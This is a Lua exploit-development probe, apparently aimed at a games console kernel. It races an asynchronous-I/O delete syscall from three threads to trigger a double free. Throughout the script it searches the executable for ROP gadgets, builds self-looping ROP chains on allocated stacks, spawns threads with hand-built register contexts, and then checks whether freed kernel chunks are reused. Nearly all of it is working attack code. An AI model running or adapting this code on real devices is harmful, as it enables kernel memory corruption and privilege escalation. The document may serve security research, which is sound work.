-- CRASH_CLASS: HIGH
-- PROBE 714a: three native children hammering aio delete in a loop.
--
-- Context: 712c showed a thr_create child can run a syscall and return into a
-- gadget chain on its own stack, and 714b found pop rax/rdi/rsi/rdx/rcx/rsp and
-- jmp$ in eboot. 713a showed a single back-to-back spawn is too slow: the first
-- child finished all eight deletes before the second started, because spawn
-- latency is larger than the whole handler.
--
-- So the children here do not run once. Their chain repeats:
--     fn(662) -> pop rax,662 -> fn(662) -> pop rsp,<chain> -> ...
-- which re-enters the delete forever with RDI/RSI/RDX untouched. Three children
-- therefore sit inside the delete path continuously.
--
-- The parent publishes a fresh id into the shared id page every round, polls it,
-- and moves on. The window that matters is the ten instructions between the
-- post-unlock re-lookup and the slot removal, and it exists only for a live id;
-- every round gives all three children one more chance at it.
--
-- A genuine double free would leave the same 0x58 chunk on the freelist twice,
-- so two later objects could share one work item. The health block at the end
-- looks for exactly that.

print("=== PROBE 714a: native aio delete hammer ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=" .. q(fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk = 0x1000
    local off = 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rsp = find_pat(ebase, 0x494000, string.char(0x5C,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
print("[A] eboot=" .. q(ebase) .. " pop_rax=" .. q(pop_rax or 0) .. " pop_rsp=" .. q(pop_rsp or 0) .. " jmp$=" .. q(jmp_g or 0))
if not pop_rax or not pop_rsp or not jmp_g then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local C = {MAGIC=0x108, FLAGS=0x0D0, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

-- [B] three looping children
local id_page = mmap(page)
local kids = 0
for k=1,3 do
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rax))
    wq(base+8,  uint64(662))
    wq(base+16, uint64(fn))
    wq(base+24, uint64(pop_rsp))
    wq(base+32, uint64(base))
    wq(base+40, uint64(jmp_g))
    local stat = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+C.MAGIC, uint64(0x480))
    wq(ctx+C.TYPE, uint64(0x10000))
    wq(ctx+C.CS, uint64(0x43))
    wq(ctx+C.SS, uint64(0x3B))
    wq(ctx+C.RIP, uint64(fn))
    wq(ctx+C.RSP, uint64(base))
    wq(ctx+C.RDI, uint64(id_page))
    wq(ctx+C.RSI, uint64(1))
    wq(ctx+C.RDX, uint64(stat))
    wq(ctx+C.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    print(string.format("[B] child %d ok=%s rv=%s tid=%s", k, tostring(ok), tostring(to_num(rv)), q(rq(tb) or 0)))
    if ok then kids = kids + 1 end
end
print(string.format("[B] %d children looping delete", kids))
if kids == 0 then return end

-- [C] publish one live id per round
local ROUNDS = 120
local data = mmap(page)
local outid = mmap(page)
local pout = mmap(page)
local okc, badc, deleted = 0, 0, 0
local ts = memory.alloc(16)
wq(ts, 0); wq(ts+8, 2000000)
for i=1,ROUNDS do
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(outid)) end)
    local id = rd(outid) or 0
    if ok1 and to_num(rv1) == 0 and id ~= 0 then
        okc = okc + 1
        wd(id_page, id)
        pcall(function() mk(664)(uint64(outid), uint64(1), uint64(pout)) end)
        pcall(function() mk(240)(uint64(ts), uint64(0)) end)
        local s = mmap(0x4000)
        wd(s, 0x77777777)
        local ok2, rv2 = pcall(function() return mk(662)(uint64(outid), uint64(1), uint64(s)) end)
        if ok2 and to_num(rv2) == 0 and (rd(s) or 0) == 0 then deleted = deleted + 1 end
    else
        badc = badc + 1
    end
end
print(string.format("[C] rounds=%d created=%d failed-create=%d parent-deleted=%d", ROUNDS, okc, badc, deleted))

-- [D] health: does any pair of fresh objects share a work item?
local d2 = mmap(page)
local o1 = mmap(page)
local o2 = mmap(page)
local p1 = mmap(page)
local p2 = mmap(page)
local function create_one(o)
    local ok, rv = pcall(function() return mk(669)(uint64(0x1), uint64(d2), uint64(1), uint64(1), uint64(o)) end)
    return ok and to_num(rv) == 0, rd(o) or 0
end
local okA, idA = create_one(o1)
local okB, idB = create_one(o2)
print(string.format("[D] create A ok=%s id=0x%X  B ok=%s id=0x%X", tostring(okA), idA, tostring(okB), idB))
if okA and okB then
    pcall(function() mk(664)(uint64(o1), uint64(1), uint64(p1)) end)
    pcall(function() mk(664)(uint64(o2), uint64(1), uint64(p2)) end)
    print(string.format("[D] poll A=0x%X B=0x%X", rd(p1) or 0, rd(p2) or 0))
    local s1 = mmap(page)
    wd(s1, 0x77777777)
    local okd, rvd = pcall(function() return mk(662)(uint64(o1), uint64(1), uint64(s1)) end)
    print(string.format("[D] delete A rv=%s status=%08X", tostring(to_num(rvd)), rd(s1) or 0))
    local p2b = mmap(page)
    wd(p2b, 0x77777777)
    local okp, rvp = pcall(function() return mk(664)(uint64(o2), uint64(1), uint64(p2b)) end)
    print(string.format("[D] poll B after A deleted: rv=%s state=%08X (was 0x%X)", tostring(to_num(rvp)), rd(p2b) or 0, rd(p2) or 0))
end

print(string.format("[Z] alive=%d", to_num(native.fcall_with_rax(fn_ud, 20))))
